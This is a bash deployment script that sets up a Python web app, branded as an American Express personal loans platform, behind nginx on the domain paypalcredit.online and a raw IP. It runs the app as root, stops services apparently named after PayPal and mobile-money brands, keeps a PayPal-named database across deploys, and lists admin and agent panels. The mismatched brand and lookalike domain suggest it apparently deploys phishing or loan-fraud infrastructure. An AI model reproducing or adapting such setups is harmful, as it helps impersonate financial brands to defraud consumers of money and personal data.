#!/usr/bin/env bash
# ==============================================================================
# American Express Personal Loans Platform - VPS Deployment Script & Nginx Setup
# ==============================================================================

set -e

APP_NAME="amex"
APP_DIR="/var/www/amex"
PORT="8000"
ARCHIVE_PATH="/tmp/amex_deploy.tar.gz"

echo "=================================================="
echo " Deploying American Express Personal Loans Platform"
echo " Target Directory: $APP_DIR"
echo "=================================================="

# 1. Stop conflicting old services
echo "[1/6] Stopping old services..."
systemctl stop amex 2>/dev/null || true
systemctl stop paypal 2>/dev/null || true
systemctl stop momo 2>/dev/null || true
systemctl stop mixx 2>/dev/null || true
systemctl stop django_water 2>/dev/null || true
pkill -f "python.*server.py" 2>/dev/null || true

# 2. Extract new project files
echo "[2/6] Extracting files into $APP_DIR..."
mkdir -p "$APP_DIR"
if [ -f "$ARCHIVE_PATH" ]; then
    if [ -f "$APP_DIR/paypal_credit.sqlite3" ]; then
        cp -f "$APP_DIR/paypal_credit.sqlite3" /tmp/paypal_credit.sqlite3.bak 2>/dev/null || true
    fi
    rm -rf "${APP_DIR:?}"/*
    tar -xzf "$ARCHIVE_PATH" -C "$APP_DIR"
    if [ -f /tmp/paypal_credit.sqlite3.bak ]; then
        mv -f /tmp/paypal_credit.sqlite3.bak "$APP_DIR/paypal_credit.sqlite3"
    fi
    rm -f "$ARCHIVE_PATH"
fi
chown -R root:root "$APP_DIR"
chmod -R 755 "$APP_DIR"

# 3. Create Systemd Service for Python Server
echo "[3/6] Setting up Systemd service..."
cat > "/etc/systemd/system/${APP_NAME}.service" <<EOF
[Unit]
Description=American Express Personal Loans Financing & Underwriting Platform
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$APP_DIR
ExecStart=/usr/bin/python3 $APP_DIR/server.py
Restart=always
RestartSec=2
Environment=HOST=0.0.0.0
Environment=PORT=$PORT
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable "$APP_NAME"
systemctl restart "$APP_NAME"

# 4. FIX NGINX: Set up site config for paypalcredit.online & reverse proxy
echo "[4/7] Setting up Nginx config for paypalcredit.online and IP proxy..."
rm -rf /etc/nginx/sites-enabled/*
rm -rf /etc/nginx/conf.d/*

cat > "/etc/nginx/sites-available/$APP_NAME" <<'EOF'
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name paypalcredit.online www.paypalcredit.online 89.125.43.3 _;

    client_max_body_size 50M;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_buffering off;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
}
EOF

# Link as default site in sites-enabled
ln -sf "/etc/nginx/sites-available/$APP_NAME" /etc/nginx/sites-enabled/00-paypal

# Test Nginx syntax and restart
nginx -t
systemctl restart nginx

# 5. Open firewall ports
echo "[5/7] Opening ports 80, 443, and 8000..."
if command -v ufw >/dev/null 2>&1; then
    ufw allow 22/tcp || true
    ufw allow 80/tcp || true
    ufw allow 443/tcp || true
    ufw allow 8000/tcp || true
fi

# 6. Setup SSL via Certbot for paypalcredit.online
echo "[6/7] Checking / Installing SSL Certificate with Certbot..."
if command -v apt-get >/dev/null 2>&1; then
    apt-get update -y >/dev/null 2>&1 || true
    apt-get install -y certbot python3-certbot-nginx >/dev/null 2>&1 || true
fi

if command -v certbot >/dev/null 2>&1; then
    echo "Attempting to obtain SSL certificate for paypalcredit.online..."
    certbot --nginx -d paypalcredit.online -d www.paypalcredit.online --non-interactive --agree-tos --register-unsafely-without-email --redirect 2>/dev/null || {
        echo "[!] Note: Certbot will acquire SSL once DNS for paypalcredit.online has finished propagating to 89.125.43.3."
        echo "    To retry manually once DNS is active, run on VPS: certbot --nginx -d paypalcredit.online -d www.paypalcredit.online"
    }
    systemctl reload nginx 2>/dev/null || true
fi

# 7. Verify local response
echo "[7/7] Testing local connection to port 80 and port 8000..."
sleep 2
curl -s -o /dev/null -w "Port 80 HTTP Status: %{http_code}\n" http://127.0.0.1/ || true
curl -s -o /dev/null -w "Port 8000 HTTP Status: %{http_code}\n" http://127.0.0.1:8000/ || true

echo "=================================================="
echo " Endpoints:"
echo " - Domain (HTTPS):  https://paypalcredit.online/"
echo " - Domain (Admin):  https://paypalcredit.online/admin"
echo " - Domain (Agent):  https://paypalcredit.online/agent"
echo " - Direct IP:       http://89.125.43.3/"
echo "=================================================="

